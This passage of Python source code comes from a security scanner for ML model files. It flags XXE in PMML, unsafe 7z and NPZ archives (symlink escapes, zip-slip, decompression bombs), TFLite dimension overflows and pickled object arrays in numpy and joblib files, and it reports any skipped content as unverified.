                message=f"PMML file contains an external entity declaration "
                        f"({exc.name!r} referencing {exc.sysid!r}). "
                        "XXE is a file-read and SSRF primitive that needs no "
                        "code execution.",
                severity=Severity.HIGH,
                category=Category.INJECTION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.9,
                cwe_ids=[611, 918],
                engine="mfv",
                metadata={"entity_name": exc.name, "system_id": exc.sysid},
            ))
            return findings
        except ET.ParseError as exc:
            # Exception-oriented evasion applies to XML as much as to pickle:
            # returning here reported a crafted PMML as clean. PMML engines
            # differ in strictness, so a document this parser rejects can still
            # be consumed downstream.
            findings.append(_skip_unverified_finding(
                file_path,
                f"The PMML document did not parse as XML ({exc}), so its "
                f"entity declarations and <Apply> functions were never checked.",
                metadata={"skipped_reason": "unparseable_xml"},
            ))
            return findings

        if not root.tag.endswith("PMML"):
            return findings

        dangerous: list[str] = []
        for elem in root.iter():
            func = elem.attrib.get("function", "")
            if func and any(pat in func for pat in self._PMML_DANGEROUS_FUNCTION_PATTERNS):
                dangerous.append(f"<{elem.tag.split('}')[-1]} function={func!r}>")

        if dangerous:
            findings.append(Finding(
                rule_id="MFV-PMML-002",
                message=f"PMML file references function name(s) associated with "
                        f"code execution: {', '.join(dangerous[:5])}. Some PMML "
                        f"engines evaluate <Apply> function attributes as code.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.7,
                cwe_ids=[94],
                engine="mfv",
                metadata={"dangerous_functions": dangerous[:20]},
            ))
        return findings

    # ── 7z container scanning ───────────────────────────────────────

    _SEVENZ_MAGIC = b"7z\xBC\xAF\x27\x1C"
    _SEVENZ_MAX_TOTAL_BYTES = 500_000_000

    # 7z is the one container that re-enters scan_file on what it extracts, so
    # an archive containing an archive recurses. Measured with a stub extractor
    # that yields a copy of its own input: RecursionError, which is an
    # unhandled crash rather than a verdict. Real checkpoints are never nested
    # this deep; four levels is generous.
    MAX_ARCHIVE_DEPTH = 4
    _archive_depth = 0

    def _scan_7z(self, file_path: Path) -> list[Finding]:
        """7z is an extraction problem, not a parse problem: py7zr is
        LGPL-2.1 (unabsorbable under the closed-source direction) and no
        model framework saves 7z, so the archive is read through a system
        7zz when one exists. Without one, the verdict is "present and
        unverifiable", never silent-clean: the same payload we flag CRITICAL
        in every .zip variant shipped as malicious1.7z in picklescan's own
        test suite and read as zero findings before this handler existed.
        """
        head = _read_file_magic(file_path, len(self._SEVENZ_MAGIC))
        if not head:
            return [_skip_unverified_finding(
                file_path,
                "The archive could not be opened, so its members were never listed.",
                metadata={"skipped_reason": "unreadable"},
            )]
        if head != self._SEVENZ_MAGIC:
            return []

        if self._archive_depth >= self.MAX_ARCHIVE_DEPTH:
            return [_skip_unverified_finding(
                file_path,
                f"Nested archives exceed the depth limit of "
                f"{self.MAX_ARCHIVE_DEPTH}, so this one was not extracted.",
                metadata={"skipped_reason": "archive_depth",
                          "depth": self._archive_depth},
            )]

        extractor = shutil.which("7zz") or shutil.which("7z")
        if extractor is None:
            return [Finding(
                rule_id="MFV-7Z-001",
                message="7z archive present, but no extractor is available to "
                        "inspect it (py7zr is LGPL-2.1 and cannot be bundled "
                        "here; a system 7zz would be used if installed). "
                        "Content could not be verified. NOT a clean verdict.",
                severity=Severity.INFO,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.4,
                engine="mfv",
                metadata={"skipped_reason": "no_extractor"},
            )]

        with tempfile.TemporaryDirectory() as tmp:
            try:
                listing = subprocess.run(  # noqa: S603 - fixed argv, no shell, "--" guards the path
                    # `--` stops switch parsing: a scanned file named
                    # "-o/tmp/x.7z" would otherwise reach 7-Zip as a flag.
                    [extractor, "l", "-slt", "--", str(file_path)],
                    capture_output=True, text=True, timeout=60, check=False,
                )
            except (OSError, subprocess.TimeoutExpired):
                listing = None
            if listing is not None and listing.returncode == 0:
                total = sum(
                    int(line.split("=", 1)[1].strip() or 0)
                    for line in listing.stdout.splitlines()
                    if line.startswith("Size =")
                )
            else:
                total = 0
            if total > self._SEVENZ_MAX_TOTAL_BYTES:
                return [Finding(
                    rule_id="MFV-7Z-001",
                    message=f"7z archive claims {total // 1_000_000}MB extracted; "
                            "over the extraction cap. Content could not be verified. "
                            "NOT a clean verdict.",
                    severity=Severity.LOW,
                    category=Category.AI_ML,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.5,
                    engine="mfv",
                    metadata={"skipped_reason": "oversized", "claimed_total": total},
                )]
            try:
                proc = subprocess.run(  # noqa: S603 - fixed argv, no shell, "--" guards the path
                    [extractor, "x", "-y", f"-o{tmp}", "--", str(file_path)],
                    capture_output=True, text=True, timeout=300, check=False,
                )
            except (OSError, subprocess.TimeoutExpired) as exc:
                return [_skip_unverified_finding(
                    file_path,
                    f"7z extraction failed ({type(exc).__name__}).",
                    metadata={"skipped_reason": "extract_failed"},
                )]
            if proc.returncode != 0:
                return [_skip_unverified_finding(
                    file_path,
                    "7z extraction failed.",
                    metadata={"skipped_reason": "extract_failed",
                              "stderr": proc.stderr[:200]},
                )]

            findings: list[Finding] = []
            tmp_root = Path(tmp).resolve()
            self._archive_depth += 1
            try:
                for extracted in sorted(Path(tmp).rglob("*")):
                    # A 7z member can be a symlink, and the extractor will
                    # happily create it. Following one reads a file outside the
                    # extraction directory and prints its contents into the
                    # report, which turns a scan into an arbitrary-file-read
                    # primitive for whoever supplied the archive (CWE-59/22).
                    # Only regular files that resolve inside tmp are scanned.
                    try:
                        resolved = extracted.resolve()
                    except OSError:
                        continue
                    if extracted.is_symlink() or resolved != extracted:
                        if tmp_root not in resolved.parents:
                            findings.append(_skip_unverified_finding(
                                file_path,
                                f"Archive member {extracted.name!r} is a link "
                                f"pointing outside the extraction directory, so "
                                f"it was not followed.",
                                metadata={"skipped_reason": "link_escape",
                                          "member": extracted.name},
                            ))
                            continue
                    if not resolved.is_file():
                        continue
                    member = str(extracted.relative_to(tmp))
                    for f in self.scan_file(extracted):
                        f.message = f"[{member}] {f.message}"
                        f.metadata = {**(f.metadata or {}), "7z_member": member}
                        findings.append(f)
            finally:
                self._archive_depth -= 1
            return findings

    # ── TFLite scanning ────────────────────────────────────────────

    def _scan_tflite(self, file_path: Path, data: bytes) -> list[Finding]:
        """TFLite executes no code on load, but its parsers allocate from
        attacker-chosen tensor dimensions. CVE-2026-42627 (ArmNN, 2026-05)
        is the shape: dimensions multiplied in 32-bit without overflow
        detection understate the allocation and the layer then reads past
        it. Replayed here in ints that do not wrap."""
        if len(data) < 8 or data[4:8] != _TFLITE_MAGIC:
            return []
        problems = _check_tflite_layout(data)
        if not problems:
            return []
        return [Finding(
            rule_id="MFV-TFLITE-001",
            message=f"TFLite tensor dimensions are inconsistent with a 32-bit "
                    f"loader: {'; '.join(problems[:5])}. CVE-2026-42627: a "
                    f"crafted model's dimension product wraps ArmNN's 32-bit "
                    f"arithmetic and the layer reads past the allocation.",
            severity=Severity.HIGH,
            category=Category.AI_ML,
            file_path=str(file_path),
            start_line=0,
            confidence=0.75,
            cwe_ids=[190, 125],
            engine="mfv",
            metadata={"layout_problems": problems[:20]},
        )]

    # ── numpy .npy/.npz scanning ───────────────────────────────────

    _NPY_MAGIC = b"\x93NUMPY"

    def _parse_npy_header(self, data: bytes) -> tuple[dict[str, Any], int] | None:
        """Parse a .npy file's header dict and return (header, data_offset).

        The header is a Python dict *literal* (not executable code) --
        ast.literal_eval evaluates only literal containers/constants, so
        this can't itself become a code-execution path even though it's
        reading attacker-controlled bytes.
        """
        if data[:6] != self._NPY_MAGIC or len(data) < 10:
            return None
        major = data[6]
        if major == 1:
            if len(data) < 10:
                return None
            header_len = struct.unpack("<H", data[8:10])[0]
            header_start = 10
        else:
            if len(data) < 12:
                return None
            header_len = struct.unpack("<I", data[8:12])[0]
            header_start = 12
        header_end = header_start + header_len
        if header_end > len(data):
            return None
        try:
            header = ast.literal_eval(data[header_start:header_end].decode("latin1").strip())
        except (ValueError, SyntaxError, UnicodeDecodeError):
            return None
        if not isinstance(header, dict):
            return None
        return header, header_end

    def _scan_npy_bytes(self, file_path: Path, data: bytes, member: str = "") -> list[Finding]:
        parsed = self._parse_npy_header(data)
        if parsed is None:
            return []
        header, data_offset = parsed
        descr = str(header.get("descr", ""))
        if "O" not in descr:
            # Numeric/fixed-width dtype -- the data section is raw array
            # bytes, not a pickle stream; nothing to scan.
            return []

        findings = self._scan_pickle(file_path, data[data_offset:])
        if member:
            for f in findings:
                f.message = f"[{member}] {f.message}"
                f.metadata = {**(f.metadata or {}), "zip_member": member}
        return findings

    # Zip-slip discipline for .npz (and any model bundle treated as a zip):
    # numpy only ever writes flat "name.npy" members, so member names that
    # escape the archive root, duplicate each other after normalization, or
    # carry symlink bits are never legitimate. Ratios bound the decompression
    # side: DEFLATE's worst case is ~1000:1, and a member claiming a large
    # decompressed size from a tiny compressed blob is the classic zip bomb.
    _ZIP_BOMB_MIN_MEMBER_BYTES = 1_000_000
    _ZIP_BOMB_MAX_RATIO = 100

    def _check_npz_container(self, zf: zipfile.ZipFile, file_path: Path) -> list[Finding]:
        problems: list[str] = []
        seen_names: dict[str, str] = {}
        for info in zf.infolist():
            name = info.filename
            segments = name.replace("\\", "/").split("/")
            normalized = "/".join(s for s in segments if s not in ("", "."))
            if (
                name.startswith(("/", "\\"))
                or re.match(r"^[A-Za-z]:[\\/]", name)
                or ".." in segments
            ):
                problems.append(f"member {name!r} escapes the archive root")
            first = seen_names.get(normalized)
            if first is not None and first != name:
                problems.append(
                    f"members {first!r} and {name!r} normalize to the same "
                    f"name ({normalized!r}), so which one a reader gets is "
                    f"parser-dependent"
                )
            else:
                seen_names.setdefault(normalized, name)
            # Unix mode bits in the high half of external_attr: a symlink
            # member extracts as a link, not a file.
            if (info.external_attr >> 16) & 0o170000 == 0o120000:
                problems.append(f"member {name!r} is a symlink entry")
            if (
                info.compress_type != zipfile.ZIP_STORED
                and info.compress_size > 0
                and info.file_size >= self._ZIP_BOMB_MIN_MEMBER_BYTES
                and info.file_size / info.compress_size > self._ZIP_BOMB_MAX_RATIO
            ):
                problems.append(
                    f"member {name!r} claims {info.file_size} bytes from "
                    f"{info.compress_size} compressed "
                    f"({info.file_size // max(info.compress_size, 1)}:1)"
                )
        if not problems:
            return []
        return [Finding(
            rule_id="MFV-NPZ-001",
            message=f"NPZ container violates zip-safety discipline: "
                    f"{'; '.join(problems[:5])}. Extracting this archive can "
                    f"write outside its target directory or exhaust disk/memory.",
            severity=Severity.MEDIUM,
            category=Category.PATH_TRAVERSAL,
            file_path=str(file_path),
            start_line=0,
            confidence=0.6,
            cwe_ids=[22],
            engine="mfv",
            metadata={"problems": problems[:20]},
        )]

    def _scan_numpy(self, file_path: Path, data: bytes) -> list[Finding]:
        """`numpy.load(..., allow_pickle=True)` on an object-dtype array is a
        pickle load in disguise -- numpy serializes an object-dtype array's
        elements via pickle.dump, so the .npy data section past the header
        is a real pickle stream once descr indicates dtype=object."""
        if file_path.suffix.lower() == ".npz":
            findings: list[Finding] = []
            try:
                zf = zipfile.ZipFile(file_path, "r")
            except (zipfile.BadZipFile, OSError):
                # Not a zip at all: the extension-confusion check in
                # scan_file owns that case for .npz.
                return []
            try:
                with zf:
                    findings.extend(self._check_npz_container(zf, file_path))
                    for name in zf.namelist():
                        if not name.endswith(".npy"):
                            continue
                        try:
                            member_data = self._read_zip_member_capped(zf, name, self.MAX_ZIP_MEMBER_BYTES)
                        except (OSError, zipfile.BadZipFile, RuntimeError):
                            continue
                        if member_data is None:
                            continue
                        findings.extend(self._scan_npy_bytes(file_path, member_data, member=name))
            except (zipfile.BadZipFile, OSError) as exc:
                # The walk died partway. Returning [] would discard the
                # container check and the members already scanned.
                findings.append(Finding(
                    rule_id="MFV-SKIP-002",
                    message=f"Zip container walk ended early ({type(exc).__name__}), so any "
                            f"members past the failure point were never analysed. NOT a clean "
                            f"verdict for the remainder of the archive.",
                    severity=Severity.LOW,
                    category=Category.AI_ML,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.50,
                    engine="mfv",
                    metadata={"skipped_reason": "zip_walk_failed", "error": type(exc).__name__},
                ))
            return findings
        return self._scan_npy_bytes(file_path, data)

    # ── joblib scanning ────────────────────────────────────────────

    def _decompress_capped(self, data: bytes, max_bytes: int,
                           codec: str = "zlib") -> bytes | None:
        """Bounded decompression for any codec joblib writes.

        Same contract as the zlib-only version it generalises: chunked, and
        None once the output would exceed the cap, so a small archive cannot
        expand into a memory-exhausting payload.
        """
        decompressor = _new_decompressor(codec)
        out = bytearray()
        step = 1 << 20
        for offset in range(0, len(data), step):
            chunk = data[offset:offset + step]
            produced = decompressor.decompress(chunk, max_bytes - len(out) + 1)
            out.extend(produced)
            if len(out) > max_bytes:
                return None
            if getattr(decompressor, "eof", False):
                break
        return bytes(out)

    def _decompress_zlib_capped(self, data: bytes, max_bytes: int) -> bytes | None:
        """Inflate a raw zlib stream in bounded chunks, aborting once
        max_bytes is exceeded.

        Mirrors ``_read_zip_member_capped``: DEFLATE's declared/compressed
        size can't be trusted as a proxy for its decompressed size (worst-case
        expansion is roughly 1000:1+), so a naive ``zlib.decompress(data)``
        call can be handed a small, well-under-the-file-size-cap payload that
        still exhausts memory on load. ``decompressobj.decompress(buf,
        max_length)`` only inflates up to ``max_length`` bytes per call and
        leaves the rest of the not-yet-processed input in
        ``unconsumed_tail`` -- feed that back in on the next call and stop as
        soon as the running total crosses the cap, instead of ever
        materializing the full inflated buffer.
        """
        decompressor = zlib.decompressobj()
        chunks: list[bytes] = []
        total = 0
        chunk_size = 1_000_000
        pending = data
        while True:
            out = decompressor.decompress(pending, chunk_size)
            total += len(out)
            if total > max_bytes:
                return None
            chunks.append(out)
            pending = decompressor.unconsumed_tail
            if not pending:
                break
        tail = decompressor.flush()
        total += len(tail)
        if total > max_bytes:
            return None
        chunks.append(tail)
        return b"".join(chunks)

    def _scan_joblib(self, file_path: Path, data: bytes) -> list[Finding]:
        """joblib.dump() without compression writes a plain pickle stream;
        with compress= set, it wraps a zlib-compressed pickle behind a zlib
        magic header. Both routes ultimately end in a real pickle stream,
        so both are handed to the same hardened callable-resolution scanner
        pickle.loads() itself uses -- this doesn't attempt joblib's other
        compressor backends (lz4, blosc) or its large-array memmap chunking,
        best-effort per issue #77's own scope.

        Decompression is bounded the same way `_read_zip_member_capped`
        bounds zip-backed formats (DEF-33): a small, well-under-the-file-size
        -cap compressed stream can still expand into a memory-exhausting
        payload, so this never calls the unbounded `zlib.decompress`.
        """
        codec = _sniff_compression(data)
        if codec is not None:
            try:
                decompressed = self._decompress_capped(
                    data, self.MAX_ZIP_MEMBER_BYTES, codec)
            except (zlib.error, OSError, EOFError, lzma.LZMAError):
                pass
            else:
                if decompressed is None:
                    return [Finding(
                        rule_id="MFV-JOBLIB-002",
                        message=f"joblib file's {codec}-compressed payload exceeds "
                                f"{self.MAX_ZIP_MEMBER_BYTES // 1_000_000}MB decompressed size "
                                f"limit -- possible decompression bomb. Skipping for memory safety.",
                        severity=Severity.HIGH,
                        category=Category.AI_ML,
                        file_path=str(file_path),
                        start_line=0,
                        confidence=0.6,
                        engine="mfv",
                        metadata={"skipped_reason": "oversized_decompressed"},
                    )]
                return self._scan_pickle(file_path, decompressed)
        return self._scan_pickle(file_path, data)
